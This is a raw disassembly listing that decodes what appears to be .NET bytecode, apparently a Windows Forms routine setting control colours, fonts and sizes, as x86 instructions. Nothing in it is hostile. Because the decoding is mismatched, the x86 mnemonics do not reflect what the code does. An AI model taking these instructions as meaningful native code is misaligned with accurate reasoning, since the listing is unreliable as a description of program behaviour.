  403a40:	0a 00                	or     (%eax),%al
  403a42:	02 7b 18             	add    0x18(%ebx),%bh
  403a45:	00 00                	add    %al,(%eax)
  403a47:	04 1f                	add    $0x1f,%al
  403a49:	0b 6f 3a             	or     0x3a(%edi),%ebp
  403a4c:	00 00                	add    %al,(%eax)
  403a4e:	0a 00                	or     (%eax),%al
  403a50:	02 7b 18             	add    0x18(%ebx),%bh
  403a53:	00 00                	add    %al,(%eax)
  403a55:	04 72                	add    $0x72,%al
  403a57:	91                   	xchg   %eax,%ecx
  403a58:	03 00                	add    (%eax),%eax
  403a5a:	70 6f                	jo     0x403acb
  403a5c:	47                   	inc    %edi
  403a5d:	00 00                	add    %al,(%eax)
  403a5f:	0a 00                	or     (%eax),%al
  403a61:	02 7b 18             	add    0x18(%ebx),%bh
  403a64:	00 00                	add    %al,(%eax)
  403a66:	04 18                	add    $0x18,%al
  403a68:	6f                   	outsl  %ds:(%esi),(%dx)
  403a69:	50                   	push   %eax
  403a6a:	00 00                	add    %al,(%eax)
  403a6c:	0a 00                	or     (%eax),%al
  403a6e:	02 7b 18             	add    0x18(%ebx),%bh
  403a71:	00 00                	add    %al,(%eax)
  403a73:	04 16                	add    $0x16,%al
  403a75:	6f                   	outsl  %ds:(%esi),(%dx)
  403a76:	48                   	dec    %eax
  403a77:	00 00                	add    %al,(%eax)
  403a79:	0a 00                	or     (%eax),%al
  403a7b:	02 7b 18             	add    0x18(%ebx),%bh
  403a7e:	00 00                	add    %al,(%eax)
  403a80:	04 02                	add    $0x2,%al
  403a82:	fe 06                	incb   (%esi)
  403a84:	18 00                	sbb    %al,(%eax)
  403a86:	00 06                	add    %al,(%esi)
  403a88:	73 49                	jae    0x403ad3
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 6f 4a             	or     0x4a(%edi),%ch
  403a8f:	00 00                	add    %al,(%eax)
  403a91:	0a 00                	or     (%eax),%al
  403a93:	02 7b 19             	add    0x19(%ebx),%bh
  403a96:	00 00                	add    %al,(%eax)
  403a98:	04 17                	add    $0x17,%al
  403a9a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9b:	3e 00 00             	add    %al,%ds:(%eax)
  403a9e:	0a 00                	or     (%eax),%al
  403aa0:	02 7b 19             	add    0x19(%ebx),%bh
  403aa3:	00 00                	add    %al,(%eax)
  403aa5:	04 20                	add    $0x20,%al
  403aa7:	d8 00                	fadds  (%eax)
  403aa9:	00 00                	add    %al,(%eax)
  403aab:	16                   	push   %ss
  403aac:	1f                   	pop    %ds
  403aad:	32 28                	xor    (%eax),%ch
  403aaf:	32 00                	xor    (%eax),%al
  403ab1:	00 0a                	add    %cl,(%edx)
  403ab3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab4:	33 00                	xor    (%eax),%eax
  403ab6:	00 0a                	add    %cl,(%edx)
  403ab8:	00 02                	add    %al,(%edx)
  403aba:	7b 19                	jnp    0x403ad5
  403abc:	00 00                	add    %al,(%eax)
  403abe:	04 6f                	add    $0x6f,%al
  403ac0:	3f                   	aas
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	0a 20                	or     (%eax),%ah
  403ac5:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 20                	add    %ah,(%eax)
  403acf:	a2 00 00 00 28       	mov    %al,0x28000000
  403ad4:	32 00                	xor    (%eax),%al
  403ad6:	00 0a                	add    %cl,(%edx)
  403ad8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ad9:	40                   	inc    %eax
  403ada:	00 00                	add    %al,(%eax)
  403adc:	0a 00                	or     (%eax),%al
  403ade:	02 7b 19             	add    0x19(%ebx),%bh
  403ae1:	00 00                	add    %al,(%eax)
  403ae3:	04 6f                	add    $0x6f,%al
  403ae5:	3f                   	aas
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	0a 20                	or     (%eax),%ah
  403aea:	d8 00                	fadds  (%eax)
  403aec:	00 00                	add    %al,(%eax)
  403aee:	16                   	push   %ss
  403aef:	1f                   	pop    %ds
  403af0:	32 28                	xor    (%eax),%ch
  403af2:	32 00                	xor    (%eax),%al
  403af4:	00 0a                	add    %cl,(%edx)
  403af6:	6f                   	outsl  %ds:(%esi),(%dx)
  403af7:	41                   	inc    %ecx
  403af8:	00 00                	add    %al,(%eax)
  403afa:	0a 00                	or     (%eax),%al
  403afc:	02 7b 19             	add    0x19(%ebx),%bh
  403aff:	00 00                	add    %al,(%eax)
  403b01:	04 6f                	add    $0x6f,%al
  403b03:	3f                   	aas
  403b04:	00 00                	add    %al,(%eax)
  403b06:	0a 20                	or     (%eax),%ah
  403b08:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	00 20                	add    %ah,(%eax)
  403b12:	a2 00 00 00 28       	mov    %al,0x28000000
  403b17:	32 00                	xor    (%eax),%al
  403b19:	00 0a                	add    %cl,(%edx)
  403b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1c:	42                   	inc    %edx
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	0a 00                	or     (%eax),%al
  403b21:	02 7b 19             	add    0x19(%ebx),%bh
  403b24:	00 00                	add    %al,(%eax)
  403b26:	04 16                	add    $0x16,%al
  403b28:	6f                   	outsl  %ds:(%esi),(%dx)
  403b29:	43                   	inc    %ebx
  403b2a:	00 00                	add    %al,(%eax)
  403b2c:	0a 00                	or     (%eax),%al
  403b2e:	02 7b 19             	add    0x19(%ebx),%bh
  403b31:	00 00                	add    %al,(%eax)
  403b33:	04 72                	add    $0x72,%al
  403b35:	eb 01                	jmp    0x403b38
  403b37:	00 70 22             	add    %dh,0x22(%eax)
  403b3a:	00 00                	add    %al,(%eax)
  403b3c:	10 41 16             	adc    %al,0x16(%ecx)
  403b3f:	19 20                	sbb    %esp,(%eax)
  403b41:	a2 00 00 00 73       	mov    %al,0x73000000
  403b46:	44                   	inc    %esp
  403b47:	00 00                	add    %al,(%eax)
  403b49:	0a 6f 45             	or     0x45(%edi),%ch
  403b4c:	00 00                	add    %al,(%eax)
  403b4e:	0a 00                	or     (%eax),%al
  403b50:	02 7b 19             	add    0x19(%ebx),%bh
  403b53:	00 00                	add    %al,(%eax)
  403b55:	04 20                	add    $0x20,%al
  403b57:	f9                   	stc
  403b58:	00 00                	add    %al,(%eax)
  403b5a:	00 20                	add    %ah,(%eax)
  403b5c:	de 00                	fiadds (%eax)
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	20 c9                	and    %cl,%cl
  403b62:	00 00                	add    %al,(%eax)
  403b64:	00 28                	add    %ch,(%eax)
  403b66:	32 00                	xor    (%eax),%al
  403b68:	00 0a                	add    %cl,(%edx)
  403b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6b:	46                   	inc    %esi
  403b6c:	00 00                	add    %al,(%eax)
  403b6e:	0a 00                	or     (%eax),%al
  403b70:	02 7b 19             	add    0x19(%ebx),%bh
  403b73:	00 00                	add    %al,(%eax)
  403b75:	04 1f                	add    $0x1f,%al
  403b77:	10 1f                	adc    %bl,(%edi)
  403b79:	21 73 35             	and    %esi,0x35(%ebx)
  403b7c:	00 00                	add    %al,(%eax)
  403b7e:	0a 6f 36             	or     0x36(%edi),%ch
  403b81:	00 00                	add    %al,(%eax)
  403b83:	0a 00                	or     (%eax),%al
  403b85:	02 7b 19             	add    0x19(%ebx),%bh
  403b88:	00 00                	add    %al,(%eax)
  403b8a:	04 72                	add    $0x72,%al
  403b8c:	99                   	cltd
  403b8d:	03 00                	add    (%eax),%eax
  403b8f:	70 6f                	jo     0x403c00
  403b91:	37                   	aaa
  403b92:	00 00                	add    %al,(%eax)
  403b94:	0a 00                	or     (%eax),%al
  403b96:	02 7b 19             	add    0x19(%ebx),%bh
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	04 1f                	add    $0x1f,%al
  403b9d:	40                   	inc    %eax
  403b9e:	1f                   	pop    %ds
  403b9f:	1b 73 38             	sbb    0x38(%ebx),%esi
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	0a 6f 39             	or     0x39(%edi),%ch
  403ba7:	00 00                	add    %al,(%eax)
  403ba9:	0a 00                	or     (%eax),%al
  403bab:	02 7b 19             	add    0x19(%ebx),%bh
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	04 1f                	add    $0x1f,%al
  403bb2:	0a 6f 3a             	or     0x3a(%edi),%ch
  403bb5:	00 00                	add    %al,(%eax)
  403bb7:	0a 00                	or     (%eax),%al
  403bb9:	02 7b 19             	add    0x19(%ebx),%bh
  403bbc:	00 00                	add    %al,(%eax)
  403bbe:	04 72                	add    $0x72,%al
  403bc0:	a9 03 00 70 6f       	test   $0x6f700003,%eax
  403bc5:	47                   	inc    %edi
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	0a 00                	or     (%eax),%al
  403bca:	02 7b 19             	add    0x19(%ebx),%bh
  403bcd:	00 00                	add    %al,(%eax)
  403bcf:	04 18                	add    $0x18,%al
  403bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd2:	50                   	push   %eax
  403bd3:	00 00                	add    %al,(%eax)
  403bd5:	0a 00                	or     (%eax),%al
  403bd7:	02 7b 19             	add    0x19(%ebx),%bh
  403bda:	00 00                	add    %al,(%eax)
  403bdc:	04 16                	add    $0x16,%al
  403bde:	6f                   	outsl  %ds:(%esi),(%dx)
  403bdf:	48                   	dec    %eax
  403be0:	00 00                	add    %al,(%eax)
  403be2:	0a 00                	or     (%eax),%al
  403be4:	02 7b 19             	add    0x19(%ebx),%bh
  403be7:	00 00                	add    %al,(%eax)
  403be9:	04 02                	add    $0x2,%al
  403beb:	fe 06                	incb   (%esi)
  403bed:	07                   	pop    %es
  403bee:	00 00                	add    %al,(%eax)
  403bf0:	06                   	push   %es
  403bf1:	73 49                	jae    0x403c3c
  403bf3:	00 00                	add    %al,(%eax)
  403bf5:	0a 6f 4a             	or     0x4a(%edi),%ch
  403bf8:	00 00                	add    %al,(%eax)
  403bfa:	0a 00                	or     (%eax),%al
  403bfc:	02 7b 0d             	add    0xd(%ebx),%bh
  403bff:	00 00                	add    %al,(%eax)
  403c01:	04 17                	add    $0x17,%al
  403c03:	6f                   	outsl  %ds:(%esi),(%dx)
  403c04:	3e 00 00             	add    %al,%ds:(%eax)
  403c07:	0a 00                	or     (%eax),%al
  403c09:	02 7b 0d             	add    0xd(%ebx),%bh
  403c0c:	00 00                	add    %al,(%eax)
  403c0e:	04 72                	add    $0x72,%al
  403c10:	bb 03 00 70 22       	mov    $0x22700003,%ebx
  403c15:	00 00                	add    %al,(%eax)
  403c17:	34 41                	xor    $0x41,%al
  403c19:	17                   	pop    %ss
  403c1a:	19 20                	sbb    %esp,(%eax)
  403c1c:	a2 00 00 00 73       	mov    %al,0x73000000
  403c21:	44                   	inc    %esp
  403c22:	00 00                	add    %al,(%eax)
  403c24:	0a 6f 45             	or     0x45(%edi),%ch
  403c27:	00 00                	add    %al,(%eax)
  403c29:	0a 00                	or     (%eax),%al
  403c2b:	02 7b 0d             	add    0xd(%ebx),%bh
  403c2e:	00 00                	add    %al,(%eax)
  403c30:	04 20                	add    $0x20,%al
  403c32:	f9                   	stc
  403c33:	00 00                	add    %al,(%eax)
  403c35:	00 20                	add    %ah,(%eax)
  403c37:	de 00                	fiadds (%eax)
  403c39:	00 00                	add    %al,(%eax)
  403c3b:	20 c9                	and    %cl,%cl
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	00 28                	add    %ch,(%eax)
  403c41:	32 00                	xor    (%eax),%al
  403c43:	00 0a                	add    %cl,(%edx)
  403c45:	6f                   	outsl  %ds:(%esi),(%dx)
  403c46:	46                   	inc    %esi
  403c47:	00 00                	add    %al,(%eax)
  403c49:	0a 00                	or     (%eax),%al
  403c4b:	02 7b 0d             	add    0xd(%ebx),%bh
  403c4e:	00 00                	add    %al,(%eax)
  403c50:	04 1f                	add    $0x1f,%al
  403c52:	24 18                	and    $0x18,%al
  403c54:	73 35                	jae    0x403c8b
  403c56:	00 00                	add    %al,(%eax)
  403c58:	0a 6f 36             	or     0x36(%edi),%ch
  403c5b:	00 00                	add    %al,(%eax)
  403c5d:	0a 00                	or     (%eax),%al
  403c5f:	02 7b 0d             	add    0xd(%ebx),%bh
  403c62:	00 00                	add    %al,(%eax)
  403c64:	04 72                	add    $0x72,%al
  403c66:	c7 03 00 70 6f 37    	movl   $0x376f7000,(%ebx)
  403c6c:	00 00                	add    %al,(%eax)
  403c6e:	0a 00                	or     (%eax),%al
  403c70:	02 7b 0d             	add    0xd(%ebx),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 1f                	add    $0x1f,%al
  403c77:	5c                   	pop    %esp
  403c78:	1f                   	pop    %ds
  403c79:	12 73 38             	adc    0x38(%ebx),%dh
  403c7c:	00 00                	add    %al,(%eax)
  403c7e:	0a 6f 39             	or     0x39(%edi),%ch
  403c81:	00 00                	add    %al,(%eax)
  403c83:	0a 00                	or     (%eax),%al
  403c85:	02 7b 0d             	add    0xd(%ebx),%bh
  403c88:	00 00                	add    %al,(%eax)
  403c8a:	04 1f                	add    $0x1f,%al
  403c8c:	09 6f 3a             	or     %ebp,0x3a(%edi)
  403c8f:	00 00                	add    %al,(%eax)
  403c91:	0a 00                	or     (%eax),%al
  403c93:	02 7b 0d             	add    0xd(%ebx),%bh
  403c96:	00 00                	add    %al,(%eax)
  403c98:	04 72                	add    $0x72,%al
  403c9a:	d5 03                	aad    $0x3
  403c9c:	00 70 6f             	add    %dh,0x6f(%eax)
  403c9f:	47                   	inc    %edi
  403ca0:	00 00                	add    %al,(%eax)
  403ca2:	0a 00                	or     (%eax),%al
  403ca4:	02 7b 0e             	add    0xe(%ebx),%bh
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	04 17                	add    $0x17,%al
  403cab:	6f                   	outsl  %ds:(%esi),(%dx)
  403cac:	4d                   	dec    %ebp
  403cad:	00 00                	add    %al,(%eax)
  403caf:	0a 00                	or     (%eax),%al
  403cb1:	02 7b 0e             	add    0xe(%ebx),%bh
  403cb4:	00 00                	add    %al,(%eax)
  403cb6:	04 20                	add    $0x20,%al
  403cb8:	a8 00                	test   $0x0,%al
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	15 73 35 00 00       	adc    $0x3573,%eax
  403cc1:	0a 6f 36             	or     0x36(%edi),%ch
  403cc4:	00 00                	add    %al,(%eax)
  403cc6:	0a 00                	or     (%eax),%al
  403cc8:	02 7b 0e             	add    0xe(%ebx),%bh
  403ccb:	00 00                	add    %al,(%eax)
  403ccd:	04 72                	add    $0x72,%al
  403ccf:	eb 03                	jmp    0x403cd4
  403cd1:	00 70 6f             	add    %dh,0x6f(%eax)
  403cd4:	37                   	aaa
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	0a 00                	or     (%eax),%al
  403cd9:	02 7b 0e             	add    0xe(%ebx),%bh
  403cdc:	00 00                	add    %al,(%eax)
  403cde:	04 20                	add    $0x20,%al
  403ce0:	b1 00                	mov    $0x0,%cl
  403ce2:	00 00                	add    %al,(%eax)
  403ce4:	20 19                	and    %bl,(%ecx)
  403ce6:	01 00                	add    %eax,(%eax)
  403ce8:	00 73 38             	add    %dh,0x38(%ebx)
  403ceb:	00 00                	add    %al,(%eax)
  403ced:	0a 6f 39             	or     0x39(%edi),%ch
  403cf0:	00 00                	add    %al,(%eax)
  403cf2:	0a 00                	or     (%eax),%al
  403cf4:	02 7b 0e             	add    0xe(%ebx),%bh
  403cf7:	00 00                	add    %al,(%eax)
  403cf9:	04 1d                	add    $0x1d,%al
  403cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfc:	3a 00                	cmp    (%eax),%al
  403cfe:	00 0a                	add    %cl,(%edx)
  403d00:	00 02                	add    %al,(%edx)
  403d02:	7b 0f                	jnp    0x403d13
  403d04:	00 00                	add    %al,(%eax)
  403d06:	04 17                	add    $0x17,%al
  403d08:	6f                   	outsl  %ds:(%esi),(%dx)
  403d09:	4d                   	dec    %ebp
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	0a 00                	or     (%eax),%al
  403d0e:	02 7b 0f             	add    0xf(%ebx),%bh
  403d11:	00 00                	add    %al,(%eax)
  403d13:	04 6f                	add    $0x6f,%al
  403d15:	4e                   	dec    %esi
  403d16:	00 00                	add    %al,(%eax)
  403d18:	0a 02                	or     (%edx),%al
  403d1a:	7b 1a                	jnp    0x403d36
  403d1c:	00 00                	add    %al,(%eax)
  403d1e:	04 6f                	add    $0x6f,%al
  403d20:	4f                   	dec    %edi
  403d21:	00 00                	add    %al,(%eax)
  403d23:	0a 00                	or     (%eax),%al
  403d25:	02 7b 0f             	add    0xf(%ebx),%bh
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	04 6f                	add    $0x6f,%al
  403d2c:	4e                   	dec    %esi
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	0a 02                	or     (%edx),%al
  403d31:	7b 1b                	jnp    0x403d4e
  403d33:	00 00                	add    %al,(%eax)
  403d35:	04 6f                	add    $0x6f,%al
  403d37:	4f                   	dec    %edi
  403d38:	00 00                	add    %al,(%eax)
  403d3a:	0a 00                	or     (%eax),%al
  403d3c:	02 7b 0f             	add    0xf(%ebx),%bh
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	04 6f                	add    $0x6f,%al
  403d43:	4e                   	dec    %esi
  403d44:	00 00                	add    %al,(%eax)
  403d46:	0a 02                	or     (%edx),%al
  403d48:	7b 1c                	jnp    0x403d66
  403d4a:	00 00                	add    %al,(%eax)
  403d4c:	04 6f                	add    $0x6f,%al
  403d4e:	4f                   	dec    %edi
  403d4f:	00 00                	add    %al,(%eax)
  403d51:	0a 00                	or     (%eax),%al
  403d53:	02 7b 0f             	add    0xf(%ebx),%bh
  403d56:	00 00                	add    %al,(%eax)
  403d58:	04 6f                	add    $0x6f,%al
  403d5a:	4e                   	dec    %esi
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	0a 02                	or     (%edx),%al
  403d5f:	7b 1d                	jnp    0x403d7e
  403d61:	00 00                	add    %al,(%eax)
  403d63:	04 6f                	add    $0x6f,%al
  403d65:	4f                   	dec    %edi
  403d66:	00 00                	add    %al,(%eax)
  403d68:	0a 00                	or     (%eax),%al
  403d6a:	02 7b 0f             	add    0xf(%ebx),%bh
  403d6d:	00 00                	add    %al,(%eax)
  403d6f:	04 6f                	add    $0x6f,%al
  403d71:	4e                   	dec    %esi
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 02                	or     (%edx),%al
  403d76:	7b 1e                	jnp    0x403d96
  403d78:	00 00                	add    %al,(%eax)
  403d7a:	04 6f                	add    $0x6f,%al
  403d7c:	4f                   	dec    %edi
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	0a 00                	or     (%eax),%al
  403d81:	02 7b 0f             	add    0xf(%ebx),%bh
  403d84:	00 00                	add    %al,(%eax)
  403d86:	04 6f                	add    $0x6f,%al
  403d88:	4e                   	dec    %esi
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	0a 02                	or     (%edx),%al
  403d8d:	7b 1f                	jnp    0x403dae
  403d8f:	00 00                	add    %al,(%eax)
  403d91:	04 6f                	add    $0x6f,%al
  403d93:	4f                   	dec    %edi
  403d94:	00 00                	add    %al,(%eax)
  403d96:	0a 00                	or     (%eax),%al
  403d98:	02 7b 0f             	add    0xf(%ebx),%bh
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	04 6f                	add    $0x6f,%al
  403d9f:	4e                   	dec    %esi
  403da0:	00 00                	add    %al,(%eax)
  403da2:	0a 02                	or     (%edx),%al
  403da4:	7b 20                	jnp    0x403dc6
  403da6:	00 00                	add    %al,(%eax)
  403da8:	04 6f                	add    $0x6f,%al
  403daa:	4f                   	dec    %edi
  403dab:	00 00                	add    %al,(%eax)
  403dad:	0a 00                	or     (%eax),%al
  403daf:	02 7b 0f             	add    0xf(%ebx),%bh
  403db2:	00 00                	add    %al,(%eax)
  403db4:	04 6f                	add    $0x6f,%al
  403db6:	4e                   	dec    %esi
  403db7:	00 00                	add    %al,(%eax)
  403db9:	0a 02                	or     (%edx),%al
  403dbb:	7b 10                	jnp    0x403dcd
  403dbd:	00 00                	add    %al,(%eax)
  403dbf:	04 6f                	add    $0x6f,%al
  403dc1:	4f                   	dec    %edi
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	0a 00                	or     (%eax),%al
  403dc6:	02 7b 0f             	add    0xf(%ebx),%bh
  403dc9:	00 00                	add    %al,(%eax)
  403dcb:	04 6f                	add    $0x6f,%al
  403dcd:	4e                   	dec    %esi
  403dce:	00 00                	add    %al,(%eax)
  403dd0:	0a 02                	or     (%edx),%al
  403dd2:	7b 11                	jnp    0x403de5
  403dd4:	00 00                	add    %al,(%eax)
  403dd6:	04 6f                	add    $0x6f,%al
  403dd8:	4f                   	dec    %edi
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	0a 00                	or     (%eax),%al
  403ddd:	02 7b 0f             	add    0xf(%ebx),%bh
  403de0:	00 00                	add    %al,(%eax)
  403de2:	04 20                	add    $0x20,%al
  403de4:	c4 00                	les    (%eax),%eax
  403de6:	00 00                	add    %al,(%eax)
  403de8:	1f                   	pop    %ds
  403de9:	31 73 35             	xor    %esi,0x35(%ebx)
  403dec:	00 00                	add    %al,(%eax)
  403dee:	0a 6f 36             	or     0x36(%edi),%ch
  403df1:	00 00                	add    %al,(%eax)
  403df3:	0a 00                	or     (%eax),%al
  403df5:	02 7b 0f             	add    0xf(%ebx),%bh
  403df8:	00 00                	add    %al,(%eax)
  403dfa:	04 72                	add    $0x72,%al
  403dfc:	f9                   	stc
  403dfd:	03 00                	add    (%eax),%eax
  403dff:	70 6f                	jo     0x403e70
  403e01:	37                   	aaa
  403e02:	00 00                	add    %al,(%eax)
  403e04:	0a 00                	or     (%eax),%al
  403e06:	02 7b 0f             	add    0xf(%ebx),%bh
  403e09:	00 00                	add    %al,(%eax)
  403e0b:	04 20                	add    $0x20,%al
  403e0d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403e0e:	00 00                	add    %al,(%eax)
  403e10:	00 20                	add    %ah,(%eax)
  403e12:	19 01                	sbb    %eax,(%ecx)
  403e14:	00 00                	add    %al,(%eax)
  403e16:	73 38                	jae    0x403e50
  403e18:	00 00                	add    %al,(%eax)
  403e1a:	0a 6f 39             	or     0x39(%edi),%ch
  403e1d:	00 00                	add    %al,(%eax)
  403e1f:	0a 00                	or     (%eax),%al
  403e21:	02 7b 0f             	add    0xf(%ebx),%bh
  403e24:	00 00                	add    %al,(%eax)
  403e26:	04 1d                	add    $0x1d,%al
  403e28:	6f                   	outsl  %ds:(%esi),(%dx)
  403e29:	3a 00                	cmp    (%eax),%al
  403e2b:	00 0a                	add    %cl,(%edx)
  403e2d:	00 02                	add    %al,(%edx)
  403e2f:	7b 0f                	jnp    0x403e40
  403e31:	00 00                	add    %al,(%eax)
  403e33:	04 02                	add    $0x2,%al
  403e35:	fe 06                	incb   (%esi)
  403e37:	08 00                	or     %al,(%eax)
  403e39:	00 06                	add    %al,(%esi)
  403e3b:	73 51                	jae    0x403e8e
  403e3d:	00 00                	add    %al,(%eax)
  403e3f:	0a 6f 52             	or     0x52(%edi),%ch
  403e42:	00 00                	add    %al,(%eax)
  403e44:	0a 00                	or     (%eax),%al
  403e46:	02 7b 1a             	add    0x1a(%ebx),%bh
  403e49:	00 00                	add    %al,(%eax)
  403e4b:	04 17                	add    $0x17,%al
  403e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4e:	3e 00 00             	add    %al,%ds:(%eax)
  403e51:	0a 00                	or     (%eax),%al
  403e53:	02 7b 1a             	add    0x1a(%ebx),%bh
  403e56:	00 00                	add    %al,(%eax)
  403e58:	04 20                	add    $0x20,%al
  403e5a:	d8 00                	fadds  (%eax)
  403e5c:	00 00                	add    %al,(%eax)
  403e5e:	16                   	push   %ss
  403e5f:	1f                   	pop    %ds
  403e60:	32 28                	xor    (%eax),%ch
  403e62:	32 00                	xor    (%eax),%al
  403e64:	00 0a                	add    %cl,(%edx)
  403e66:	6f                   	outsl  %ds:(%esi),(%dx)
  403e67:	33 00                	xor    (%eax),%eax
  403e69:	00 0a                	add    %cl,(%edx)
  403e6b:	00 02                	add    %al,(%edx)
  403e6d:	7b 1a                	jnp    0x403e89
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	04 6f                	add    $0x6f,%al
  403e73:	3f                   	aas
  403e74:	00 00                	add    %al,(%eax)
  403e76:	0a 20                	or     (%eax),%ah
  403e78:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403e7e:	00 00                	add    %al,(%eax)
  403e80:	00 20                	add    %ah,(%eax)
  403e82:	a2 00 00 00 28       	mov    %al,0x28000000
  403e87:	32 00                	xor    (%eax),%al
  403e89:	00 0a                	add    %cl,(%edx)
  403e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8c:	40                   	inc    %eax
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	0a 00                	or     (%eax),%al
  403e91:	02 7b 1a             	add    0x1a(%ebx),%bh
  403e94:	00 00                	add    %al,(%eax)
  403e96:	04 6f                	add    $0x6f,%al
  403e98:	3f                   	aas
  403e99:	00 00                	add    %al,(%eax)
  403e9b:	0a 20                	or     (%eax),%ah
  403e9d:	d8 00                	fadds  (%eax)
  403e9f:	00 00                	add    %al,(%eax)
  403ea1:	16                   	push   %ss
  403ea2:	1f                   	pop    %ds
  403ea3:	32 28                	xor    (%eax),%ch
  403ea5:	32 00                	xor    (%eax),%al
  403ea7:	00 0a                	add    %cl,(%edx)
  403ea9:	6f                   	outsl  %ds:(%esi),(%dx)
  403eaa:	41                   	inc    %ecx
  403eab:	00 00                	add    %al,(%eax)
  403ead:	0a 00                	or     (%eax),%al
  403eaf:	02 7b 1a             	add    0x1a(%ebx),%bh
  403eb2:	00 00                	add    %al,(%eax)
  403eb4:	04 6f                	add    $0x6f,%al
  403eb6:	3f                   	aas
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	0a 20                	or     (%eax),%ah
  403ebb:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 20                	add    %ah,(%eax)
  403ec5:	a2 00 00 00 28       	mov    %al,0x28000000
  403eca:	32 00                	xor    (%eax),%al
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	6f                   	outsl  %ds:(%esi),(%dx)
  403ecf:	42                   	inc    %edx
  403ed0:	00 00                	add    %al,(%eax)
  403ed2:	0a 00                	or     (%eax),%al
  403ed4:	02 7b 1a             	add    0x1a(%ebx),%bh
  403ed7:	00 00                	add    %al,(%eax)
  403ed9:	04 16                	add    $0x16,%al
  403edb:	6f                   	outsl  %ds:(%esi),(%dx)
  403edc:	43                   	inc    %ebx
  403edd:	00 00                	add    %al,(%eax)
  403edf:	0a 00                	or     (%eax),%al
  403ee1:	02 7b 1a             	add    0x1a(%ebx),%bh
  403ee4:	00 00                	add    %al,(%eax)
  403ee6:	04 72                	add    $0x72,%al
  403ee8:	eb 01                	jmp    0x403eeb
  403eea:	00 70 22             	add    %dh,0x22(%eax)
  403eed:	00 00                	add    %al,(%eax)
  403eef:	10 41 16             	adc    %al,0x16(%ecx)
  403ef2:	19 20                	sbb    %esp,(%eax)
  403ef4:	a2 00 00 00 73       	mov    %al,0x73000000
  403ef9:	44                   	inc    %esp
  403efa:	00 00                	add    %al,(%eax)
  403efc:	0a 6f 45             	or     0x45(%edi),%ch
  403eff:	00 00                	add    %al,(%eax)
  403f01:	0a 00                	or     (%eax),%al
  403f03:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 20                	add    $0x20,%al
  403f0a:	f9                   	stc
  403f0b:	00 00                	add    %al,(%eax)
  403f0d:	00 20                	add    %ah,(%eax)
  403f0f:	de 00                	fiadds (%eax)
  403f11:	00 00                	add    %al,(%eax)
  403f13:	20 c9                	and    %cl,%cl
  403f15:	00 00                	add    %al,(%eax)
  403f17:	00 28                	add    %ch,(%eax)
  403f19:	32 00                	xor    (%eax),%al
  403f1b:	00 0a                	add    %cl,(%edx)
  403f1d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f1e:	46                   	inc    %esi
  403f1f:	00 00                	add    %al,(%eax)
  403f21:	0a 00                	or     (%eax),%al
  403f23:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f26:	00 00                	add    %al,(%eax)
  403f28:	04 1f                	add    $0x1f,%al
  403f2a:	25 20 e7 00 00       	and    $0xe720,%eax
  403f2f:	00 73 35             	add    %dh,0x35(%ebx)
  403f32:	00 00                	add    %al,(%eax)
  403f34:	0a 6f 36             	or     0x36(%edi),%ch
  403f37:	00 00                	add    %al,(%eax)
  403f39:	0a 00                	or     (%eax),%al
  403f3b:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f3e:	00 00                	add    %al,(%eax)
  403f40:	04 72                	add    $0x72,%al
  403f42:	07                   	pop    %es
  403f43:	04 00                	add    $0x0,%al
  403f45:	70 6f                	jo     0x403fb6
  403f47:	37                   	aaa
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	0a 00                	or     (%eax),%al
  403f4c:	02 7b 1a             	add    0x1a(%ebx),%bh
  403f4f:	00 00                	add    %al,(%eax)
  403f51:	04 1f                	add    $0x1f,%al
  403f53:	59                   	pop    %ecx
  403f54:	1f                   	pop    %ds
  403f55:	1b 73 38             	sbb    0x38(%ebx),%esi
  403f58:	00 00                	add    %al,(%eax)
  403f5a:	0a 6f 39             	or     0x39(%edi),%ch
